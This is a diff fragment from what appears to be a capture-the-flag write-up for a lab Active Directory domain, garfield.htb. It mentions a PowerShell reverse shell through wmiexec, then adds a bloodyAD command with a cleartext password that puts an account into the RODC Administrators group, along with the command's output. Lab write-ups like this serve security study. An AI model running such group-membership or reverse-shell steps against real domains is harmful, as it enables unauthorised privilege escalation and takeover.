@@ -487,3 +487,11 @@ Ill then just run a powershell reverse shell payload through wmiexec
 
 I can then get a shell as the admin on `rodc01`
 
+# Domain Admin
+
+```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' add groupMember 'CN=RODC ADMINISTRATORS,CN=USERS,DC=GARFIELD,DC=HTB' 'l.wilson_adm'
+[+] l.wilson_adm added to CN=RODC ADMINISTRATORS,CN=USERS,DC=GARFIELD,DC=HTB
+```
+
+I think the path to domain admin is likely to abuse RODC
